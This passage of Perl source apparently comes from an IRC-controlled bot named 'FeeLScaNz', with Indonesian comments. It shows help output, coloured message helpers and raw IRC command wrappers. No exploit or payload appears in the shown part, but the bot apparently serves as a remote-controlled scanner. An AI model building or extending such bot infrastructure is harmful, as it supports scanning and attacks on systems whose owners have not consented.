  elsif ( $level == 3 ) { push(@help,@hlp3); }
  foreach my $m (@help) { irc_msg($chan,$m); $i++; if ( $i % $conf{linez} == 0 ) { sleep($conf{sleepz}); } }
}

##[ CUSTOM MESSAGE ]##
sub msge { my ($chan,$se,$res) = @_; irc_msg($chan,"7,1 ".$se."15 ".$res." "); }
sub msgi { my ($chan,$judul,$info) = @_; irc_msg($chan,"0,1 [$judul]9 $info "); }
sub msgn { my ($chan,$se,$nxurl) = @_; irc_msg($chan,"8,1 ".$se."15 ".$nxurl." "); }
sub msgr { my ($chan,$se,$totr,$clr) = @_; irc_msg($chan,"9,1 ".$se."15 ".$totr."0 ".$clr." "); }
sub msgt { my ($chan,$se,$res) = @_; irc_msg($chan,"3,1 ".$se."15 ".$res." "); }
sub ntci { my ($chan,$judul,$info) = @_; irc_ntc($chan,"0,1 [$judul]9 $info "); }

##[ PERINTAH RAW IRC ]##
sub irc_raw  { my $data = $_[0]; print $sock "$data\r\n"; }
sub irc_nick { my $nick = $_[0]; irc_raw("NICK $nick"); }
sub irc_user { my $ident = $_[0]; irc_raw("USER $ident localhost * :FeeLScaNz $versi"); }
sub irc_msg  { my ($to,$psn) = @_; irc_raw("PRIVMSG $to :$psn"); }
sub irc_act  { my ($to,$psn) = @_; irc_raw("PRIVMSG $to :ACTION $psn"); }
sub irc_ntc  { my ($to,$psn) = @_; irc_raw("NOTICE $to :$psn"); }
sub irc_join { my $to = $_[0]; irc_raw("JOIN $to"); }
sub irc_part { my $to = $_[0]; irc_raw("PART $to"); }
sub irc_quit { my $psn = $_[0]; irc_raw("QUIT :$psn"); exit; }

##########################
##[ Library  Community ]##
##########################





